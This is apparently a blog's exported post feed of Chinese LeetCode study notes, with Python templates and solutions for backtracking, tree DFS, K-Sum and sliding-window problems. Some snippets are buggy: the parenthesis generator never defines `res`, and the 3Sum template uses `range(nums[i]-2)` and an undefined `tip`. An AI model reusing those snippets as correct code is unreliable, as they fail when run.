<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数字 n 代表生成括号的对数，请你设计一个函数，用于能够生成所有可能的并且 有效的 括号组合。</span></span><br><span class="line"><span class="comment"># 示例 1：</span></span><br><span class="line"><span class="comment"># 输入：n = 3</span></span><br><span class="line"><span class="comment"># 输出：[&quot;((()))&quot;,&quot;(()())&quot;,&quot;(())()&quot;,&quot;()(())&quot;,&quot;()()()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例 2：</span></span><br><span class="line"><span class="comment"># 输入：n = 1</span></span><br><span class="line"><span class="comment"># 输出：[&quot;()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generateParenthesis</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        track = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">n, left, right, track</span>):</span><br><span class="line">            <span class="keyword">if</span> left &gt; n <span class="keyword">or</span> right &gt; left:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> left == right == n:</span><br><span class="line">                res.append(track)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">for</span> choice <span class="keyword">in</span> [<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>]: <span class="comment">## 注意，我们的选择其实只有&#x27;(&#x27;和&#x27;)&#x27;两个，我们的base case取决于&#x27;(&#x27;和&#x27;)&#x27;的数量</span></span><br><span class="line">                <span class="keyword">if</span> choice == <span class="string">&#x27;(&#x27;</span>: left += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: right += <span class="number">1</span></span><br><span class="line">                track += choice</span><br><span class="line">                backtrace(n, left, right, track)</span><br><span class="line">                <span class="keyword">if</span> track[-<span class="number">1</span>] == <span class="string">&#x27;(&#x27;</span>: left -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: right -= <span class="number">1</span></span><br><span class="line">                track = track[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        backtrace(n, <span class="number">0</span>, <span class="number">0</span>, track)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>



<h2 id="2-DFS类问题"><a href="#2-DFS类问题" class="headerlink" title="2. DFS类问题"></a>2. DFS类问题</h2><h3 id="226-翻转二叉树"><a href="#226-翻转二叉树" class="headerlink" title="226. 翻转二叉树"></a><a href="https://leetcode.cn/problems/invert-binary-tree/">226. 翻转二叉树</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：root = [4,2,7,1,3,6,9]</span></span><br><span class="line"><span class="comment"># 输出：[4,7,2,9,6,3,1]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invertTree</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">Optional</span>[TreeNode]:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            root.left, root.right = root.right, root.left</span><br><span class="line">            dfs(root.left)</span><br><span class="line">            dfs(root.right)</span><br><span class="line">        dfs(root)</span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure>



<h3 id="543-二叉树的直径"><a href="#543-二叉树的直径" class="headerlink" title="543. 二叉树的直径"></a><a href="https://leetcode.cn/problems/diameter-of-binary-tree/">543. 二叉树的直径</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：root = [1,2,3,4,5]</span></span><br><span class="line"><span class="comment"># 输出：3</span></span><br><span class="line"><span class="comment"># 解释：3 ，取路径 [4,2,1,3] 或 [5,2,1,3] 的长度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">diameterOfBinaryTree</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        self.d = <span class="number">0</span>  <span class="comment"># 记录最终结果</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            left = dfs(root.left)</span><br><span class="line">            right = dfs(root.right)</span><br><span class="line">            self.d = <span class="built_in">max</span>(self.d, left + right)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(left, right) + <span class="number">1</span>   <span class="comment"># 要维护的是当前结点的最长子路径，回撤操作+1</span></span><br><span class="line">        dfs(root)</span><br><span class="line">        <span class="keyword">return</span> self.d</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记2 - K-Sum类问题解题模板</title>
    <url>/2024/03/13/leetcode-ksum/</url>
    <content><![CDATA[<h1 id="Leetcode笔记2-K-Sum"><a href="#Leetcode笔记2-K-Sum" class="headerlink" title="Leetcode笔记2 - K-Sum"></a>Leetcode笔记2 - K-Sum</h1><p>K-Sum类问题是指给你一个数组，让你从中挑选出K个数字满足和为N。</p>
<p>K-Sum类的核心思想是 2Sum，然后套娃就行了。因此此类问题的关键点在于<strong>2Sum</strong>的实现。</p>
<p><strong>核心思路</strong>：</p>
<p>​	1、<strong>数组排序</strong></p>
<p>​	2、<strong>双指针</strong>：头尾相向移动，遇到相同的数字跳过</p>
<p>​	3、<strong>防止重复值</strong>：每个最外层的遍历都需要防止重复值，以及对于遍历数组的边界值的处理</p>
<p><strong>套路模板：</strong></p>
<p>实现(K-1)-Sum，以3Sum为例，首先要实现2Sum：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2-Sum可直接默写</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">nums, start, target</span>):</span><br><span class="line">    res = []</span><br><span class="line">    low, high = start, <span class="built_in">len</span>(nums)-<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        sum_ = nums[low] + nums[high]</span><br><span class="line">        <span class="keyword">if</span> sum_ &lt; target:</span><br><span class="line">            low += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 指针一定要注意，因为前面已经low += 1了</span></span><br><span class="line">            <span class="comment"># 所以现在的nums[low]一定要和nums[low-1]去比较</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span> </span><br><span class="line">        <span class="keyword">elif</span> sum_ &gt; target:</span><br><span class="line">            high -= <span class="number">1</span></span><br><span class="line">            <span class="comment"># nums[high]同理</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append([nums[low], nums[high]])</span><br><span class="line">            low += <span class="number">1</span></span><br><span class="line">            high -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3-Sum 主要是要注意边界值的问题 和 要防止有重复值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">threeSum</span>(<span class="params">nums, target</span>):</span><br><span class="line">    nums.sort()</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nums[i]-<span class="number">2</span>): <span class="comment">## 注意边界值为K-1</span></span><br><span class="line">        <span class="keyword">if</span> nums[i] &gt; <span class="number">0</span>: <span class="keyword">break</span> <span class="comment">## 因为是升序排列，可提高效率</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> nums[i] == nums[i-<span class="number">1</span>]: <span class="keyword">continue</span> <span class="comment">## 防止有重复值</span></span><br><span class="line">        <span class="comment">## 调用2Sum</span></span><br><span class="line">        target_ = target - nums[i]</span><br><span class="line">        tuples = twoSum(nums, i+<span class="number">1</span>, target_)</span><br><span class="line">        <span class="keyword">for</span> tup <span class="keyword">in</span> tuples:</span><br><span class="line">            tup.append(nums[i])</span><br><span class="line">            res.append(tip)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">        </span><br></pre></td></tr></table></figure>



<h2 id="15-三数之和"><a href="#15-三数之和" class="headerlink" title="15. 三数之和"></a><a href="https://leetcode.cn/problems/3sum/">15. 三数之和</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self, nums, start, target</span>):</span><br><span class="line">        res = []</span><br><span class="line">        low = start</span><br><span class="line">        high = <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            sum_ = nums[low] + nums[high]</span><br><span class="line">            <span class="keyword">if</span> sum_ &gt; target:</span><br><span class="line">                high -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high = high -<span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> sum_ &lt; target:</span><br><span class="line">                low += <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.append([nums[low], nums[high]])</span><br><span class="line">                high -= <span class="number">1</span></span><br><span class="line">                low += <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">threeSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        nums.sort()</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)-<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> nums[i] &gt; <span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> nums[i] == nums[i-<span class="number">1</span>]: <span class="keyword">continue</span></span><br><span class="line">            tuples = self.twoSum(nums, i+<span class="number">1</span>, -nums[i])</span><br><span class="line">            <span class="keyword">for</span> tup <span class="keyword">in</span> tuples:</span><br><span class="line">                tup.append(nums[i])</span><br><span class="line">                res.append(tup)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h2 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a><a href="https://leetcode.cn/problems/two-sum/description/">1. 两数之和</a></h2><p>这里有个小技巧：<strong>给定一个数组，当我们每次需要移动一个指针，然后遍历扫描该指针后面的数组元素的时候，其实可以用哈希表来降低算法复杂度 —— 仅需要扫一遍即可</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [2,7,11,15], target = 9</span></span><br><span class="line"><span class="comment"># 输出：[0,1]</span></span><br><span class="line"><span class="comment"># 解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        hashtable = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i, num <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):</span><br><span class="line">            <span class="keyword">if</span> target - num <span class="keyword">in</span> hashtable:</span><br><span class="line">                <span class="keyword">return</span> [hashtable[target-num], i]</span><br><span class="line">            hashtable[nums[i]] = i <span class="comment"># 每次在最后往哈希表里更新即可</span></span><br><span class="line">        <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记1 - 滑动窗口解题模板</title>
    <url>/2024/03/12/leetcode-sliding-window/</url>
    <content><![CDATA[<p>因为工作关系，coding不常用到算法，每次面试&#x2F;工作中遇到都要回忆好久。因此特意总结一些常见leetcode算法的解题模板，面试&#x2F;工作中遇到一些类似的问题可以节省很多回忆的时间。</p>
<p><strong>模板并不是所有问题的最优解，对于不同类型的问题，时间&#x2F;空间复杂度都要分别再行思考，往往会有更加精巧的解法。</strong></p>
<h1 id="Leetcode笔记1-滑动窗口"><a href="#Leetcode笔记1-滑动窗口" class="headerlink" title="Leetcode笔记1 - 滑动窗口"></a>Leetcode笔记1 - 滑动窗口</h1><p><strong>核心思路：</strong></p>
<p>​	1、<strong>扩大窗口</strong>：移动右指针，直至达到特定要求（初始最优值）的时候</p>
<p>​	2、<strong>收缩窗口</strong>：记录当前最优值，并移动左指针，直至满足扩大窗口的要求</p>
<p><strong>套路模板</strong>：</p>
<p>​	双重循环：<strong>外层循环移动右指针</strong>，<strong>里层循环移动左指针</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">left, right = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> right <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">## 扩大窗口，右移右指针</span></span><br><span class="line">    <span class="comment">## 处理一些窗口相关的数据</span></span><br><span class="line">    <span class="keyword">while</span> window needs shirnk: <span class="comment">## 当达到当前最优值时，收缩窗口，右移左指针 </span></span><br><span class="line">    	<span class="comment">## 处理一些窗口相关的数据</span></span><br><span class="line">        keep.remove(s[left])</span><br><span class="line">        left += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## 一轮结束，开始新一轮扩大窗口</span></span><br><span class="line">    <span class="comment">## 处理一些窗口相关的数据</span></span><br><span class="line">    keep.add(s[right])</span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h2 id="3-无重复字符的最长子串"><a href="#3-无重复字符的最长子串" class="headerlink" title="3. 无重复字符的最长子串"></a><a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 给定一个字符串 s ，请你找出其中不含有重复字符的最长子串的长度。</span></span><br><span class="line"><span class="comment"># 输入: s = &quot;abcabcbb&quot;</span></span><br><span class="line"><span class="comment"># 输出: 3 </span></span><br><span class="line"><span class="comment"># 解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLongestSubstring</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        keep = <span class="built_in">set</span>()</span><br><span class="line">        left, cur_len, max_len, n = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="built_in">len</span>(s)</span><br><span class="line">        <span class="keyword">for</span> right <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">## 扩大窗口，右移右指针</span></span><br><span class="line">            cur_len += <span class="number">1</span>	<span class="comment">## 处理一些窗口相关的数据：记录当前字符串长度</span></span><br><span class="line">            <span class="keyword">while</span> s[right] <span class="keyword">in</span> keep: <span class="comment">## 当遇到重复字符时，收缩窗口，右移左指针</span></span><br><span class="line">                <span class="comment">## 处理一些窗口相关的数据：</span></span><br><span class="line">                <span class="comment">## 右移左指针（之前要先删掉窗口里的元素）</span></span><br><span class="line">                <span class="comment">## 当前长度 - 1</span></span><br><span class="line">                keep.remove(s[left]) </span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">                cur_len -= <span class="number">1</span></span><br><span class="line">            <span class="comment">## 一轮结束，需要维护最大长度值，并且增加窗口元素</span></span><br><span class="line">            max_len = <span class="built_in">max</span>(max_len, cur_len)</span><br><span class="line">            keep.add(s[right])</span><br><span class="line">        <span class="keyword">return</span> max_len</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="209-长度的最小子数组"><a href="#209-长度的最小子数组" class="headerlink" title="209. 长度的最小子数组"></a><a href="https://leetcode.cn/problems/minimum-size-subarray-sum/">209. 长度的最小子数组</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 给定一个含有 n 个正整数的数组和一个正整数 target。找出该数组中满足其总和大于等于 target 的长度最小的 连续子数组[numsl, numsl+1, ..., numsr-1, numsr] ，并返回其长度。如果不存在符合条件的子数组，返回 0 。</span></span><br><span class="line"><span class="comment"># 输入：target = 7, nums = [2,3,1,2,4,3]</span></span><br><span class="line"><span class="comment"># 输出：2</span></span><br><span class="line"><span class="comment"># 解释：子数组 [4,3] 是该条件下的长度最小的子数组。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minSubArrayLen</span>(<span class="params">self, target: <span class="built_in">int</span>, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        left, n = <span class="number">0</span>, <span class="built_in">len</span>(nums)</span><br><span class="line">        min_len = n + <span class="number">1</span></span><br><span class="line">        sum_ = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> right <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">## 扩大窗口，右移右指针</span></span><br><span class="line">            sum_ += nums[right] <span class="comment">## 求窗口的和</span></span><br><span class="line">            <span class="keyword">while</span> sum_ &gt;= target: <span class="comment">## 当和大于等于target时，收缩窗口，右移左指针</span></span><br><span class="line">                min_len = <span class="built_in">min</span>(min_len, right + <span class="number">1</span> - left) <span class="comment">## 记录最小的窗口长度</span></span><br><span class="line">                <span class="comment">## 右移左指针，当前长度-1</span></span><br><span class="line">                sum_ -= nums[left] </span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> min_len == n + <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> min_len</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
</search>
